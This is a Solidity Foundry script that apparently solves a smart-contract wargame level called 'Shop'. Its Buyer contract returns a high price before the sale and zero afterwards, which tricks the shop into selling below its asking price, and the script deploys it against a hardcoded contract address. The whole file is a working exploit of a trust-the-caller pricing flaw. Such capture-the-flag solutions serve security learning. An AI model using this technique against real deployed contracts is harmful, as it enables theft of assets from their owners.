// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";

interface IShop
{
    function buy() external;
    function isSold() external view returns (bool);
}

contract Buyer
{
    IShop public shp;

    constructor (address _shop)
    {
        shp = IShop(_shop);
    }
    function price() external view returns (uint256)
    {
        if (shp.isSold())
            return 0;
        else
            return 100;
    }
    function attack() external {
        shp.buy();
    }
}

contract ShopSolution is Script
{
    function run() external
    {
        vm.startBroadcast();
        Buyer buyer = new Buyer(0x1477248f2B264534189b99C624d132f90FB3374D);
        buyer.attack();
        console.log("weeeee");
        vm.stopBroadcast();
    }
}
